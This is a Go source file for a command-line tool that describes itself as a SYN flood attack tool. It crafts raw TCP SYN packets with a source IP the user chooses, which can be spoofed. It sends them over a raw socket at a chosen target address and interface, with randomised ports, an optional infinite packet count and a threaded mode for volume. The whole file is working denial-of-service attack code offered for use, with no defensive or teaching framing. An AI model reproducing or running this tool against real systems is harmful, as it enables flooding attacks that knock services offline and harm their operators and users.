package main

import (
	"errors"
	"math/rand"
	"net"
	"os"
	"strconv"
	"syscall"

	"github.com/akamensky/argparse"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
)

var logger zerolog.Logger

func createSYNPacket(srcIP string, dstIP string, srcPort int, dstPort int) ([]byte, error) {
	srcAddr := net.ParseIP(srcIP).To4()
	dstAddr := net.ParseIP(dstIP).To4()

	if srcAddr == nil || dstAddr == nil {
		err := errors.New("invalid IP address")
		logger.Error().Err(err).Msg("Failed to parse IP address")
		return nil, err
	}

	ipHeader := layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      64,
		Protocol: layers.IPProtocolTCP,
		SrcIP:    srcAddr,
		DstIP:    dstAddr,
	}

	tcpHeader := layers.TCP{
		SrcPort: layers.TCPPort(srcPort),
		DstPort: layers.TCPPort(dstPort),
		SYN:     true,
		DataOffset: 5,
		Window:    14600,
		Seq: 	uint32(rand.Intn(1 << 32)),
	}

	tcpHeader.SetNetworkLayerForChecksum(&ipHeader)

	buffer := gopacket.NewSerializeBuffer()
	err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths: 	true,
	}, &ipHeader, &tcpHeader)
	if err != nil {
		logger.Error().Err(err).Msg("Failed to serialize packet")
		return nil, err
	}

	return buffer.Bytes(), nil
}

func sendPacket(dstIP *string, dstPort *int, iface *string, packet []byte) {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
		if err != nil {
			logger.Error().Err(err).Msg("Failed to create socket")
			return
		}
		defer syscall.Close(fd)

		err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
		if err != nil {
			logger.Error().Err(err).Msg("Failed to set socket options")
			return
		}

		
		err = syscall.BindToDevice(fd, *iface)
		if err != nil {
			logger.Error().Err(err).Msg("Failed to bind to device")
			return
		}

		err = syscall.Sendto(fd, packet, 0, &syscall.SockaddrInet4{
			Port: *dstPort,
			Addr: [4]byte(net.ParseIP(*dstIP).To4()),
		})
		if err != nil {
			logger.Error().Err(err).Msg("Failed to send packet")
			return
		}

		logger.Debug().Str("host", *dstIP).Int("port", *dstPort).Msg("Packet sent")
}

func main() {
	zerolog.TimeFieldFormat = zerolog.TimeFormatUnix
	zerolog.SetGlobalLevel(zerolog.InfoLevel)
	logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr}).With().Timestamp().Logger()

	parser := argparse.NewParser("syn-flood", "SYN flood attack tool")


	srcIP := parser.String("", "src-ip", &argparse.Options{
		Required: true,
		Help:     "Source IP address",
		Validate: func(args []string) error {
			if len(args[0]) == 0 {
				return errors.New("host cannot be empty")
			} else {
				ip := net.ParseIP(args[0])
				if ip == nil {
					return errors.New("host must be a valid IP address")
				}
				if ip.To4() == nil {
					return errors.New("host must be a valid IPv4 address")
				}

				if ip.IsUnspecified() {
					return errors.New("host cannot be an unspecified address")
				}
			}
			return nil
		},
	})		

	dstIP := parser.String("", "dst-ip", &argparse.Options{
		Required: true,
		Help:     "Destination IP address",
		Validate: func(args []string) error {
			if len(args[0]) == 0 {
				return errors.New("host cannot be empty")
			} else {
				ip := net.ParseIP(args[0])
				if ip == nil {
					return errors.New("host must be a valid IP address")
				}
				if ip.To4() == nil {
					return errors.New("host must be a valid IPv4 address")
				}

				if ip.IsUnspecified() {
					return errors.New("host cannot be an unspecified address")
				}
			}
			return nil
		},
	})

	srcPort := parser.Int("s", "src-port", &argparse.Options{
		Required: false,
		Help:     "Source port, must be between 1025 and 65535, default is -1 (random for each packet)",
		Default:  -1,
		Validate: func(args []string) error {
			val, err := strconv.Atoi(args[0])
			if err != nil {
				return errors.New("source port must be a number")
			}
			if val < 1025 || val > 65535 {
				return errors.New("source port must be between 1025 and 65535")
			}
			return nil
		},
	})

	dstPort := parser.Int("d", "dst-port", &argparse.Options{
		Required: false,
		Help:     "Destination port, must be between 1025 and 65535, default is  -1 (random for each packet)",
		Default:  -1,
		Validate: func(args []string) error {
			val, err := strconv.Atoi(args[0])
			if err != nil {
				return errors.New("destination port must be a number")
			}
			if val < 1025 || val > 65535 {
				return errors.New("destination port must be between 1025 and 65535")
			}
			return nil
		},
	})

	iface := parser.String("i", "interface", &argparse.Options{
		Required: true,
		Help:     "Network interface to use for sending packets",
		Validate: func(args []string) error {
			if len(args[0]) == 0 {
				return errors.New("interface cannot be empty")
			} else {
				iface, err := net.InterfaceByName(args[0])
				if err != nil {
					return errors.New("interface must be a valid network interface")
				}
				if iface.Flags & net.FlagUp == 0 {
					return errors.New("interface must be up")
				}
			}
			return nil
		},
	})

	number := parser.Int("n", "number", &argparse.Options{
		Required: false,
		Help:     "Number of packets to send, -1 for infinite",
		Default:  100,
		Validate: func(args []string) error {
			val, err := strconv.Atoi(args[0])
			if err != nil {
				return errors.New("number of packets must be a number")
			}
			if val < -1 {
				return errors.New("number of packets must be greater than or equal to -1")
			}
			return nil
		},
	})

	debug := parser.Flag("D", "debug", &argparse.Options{
		Required: false,
		Help:     "Enable debug mode. You should avoid using this in production, or with threaded mode, as it slows down the program",
		Default:  false,
	})

	threaded := parser.Flag("t", "threaded", &argparse.Options{
		Required: false,
		Help:     "Enable packet creation and socket threading, default is false",
		Default: false,
	})

	err := parser.Parse(os.Args)
	if err != nil {
		logger.Fatal().Err(err).Msg("Failed to parse arguments")
	}

	if *debug {
		zerolog.SetGlobalLevel(zerolog.DebugLevel)
		logger.Debug().Msg("Debug mode enabled")
	}

	srcRandom := false
	dstRandom := false
	if *srcPort == -1 {
		srcRandom = true
	}
	if *dstPort == -1 {
		dstRandom = true
	}


	if *threaded {
		pktCh := make(chan []byte)
	
		for i := 0; i < *number || *number == -1; i++ {
			if srcRandom {
				*srcPort = rand.Intn(65535-1025) + 1025
			}
			if dstRandom {
				*dstPort = rand.Intn(65535-1025) + 1025
			}

			go func() {
				packet, err := createSYNPacket(*srcIP, *dstIP, *srcPort, *dstPort)
				if err != nil {
					logger.Error().Err(err).Msg("Failed to create packet")
					return
				}
				pktCh <- packet
			}()

			go func() {
				packet := <-pktCh
				sendPacket(dstIP, dstPort, iface, packet)
			}()
		}
	} else {
		for i := 0; i < *number || *number == -1; i++ {
			if srcRandom {
				*srcPort = rand.Intn(65535-1025) + 1025
			}

			if dstRandom {
				*dstPort = rand.Intn(65535-1025) + 1025
			}
			
			packet, err := createSYNPacket(*srcIP, *dstIP, *srcPort, *dstPort)
			if err != nil {
				logger.Error().Err(err).Msg("Failed to create packet")
				return
			}
			sendPacket(dstIP, dstPort, iface, packet)
		}
	}
}

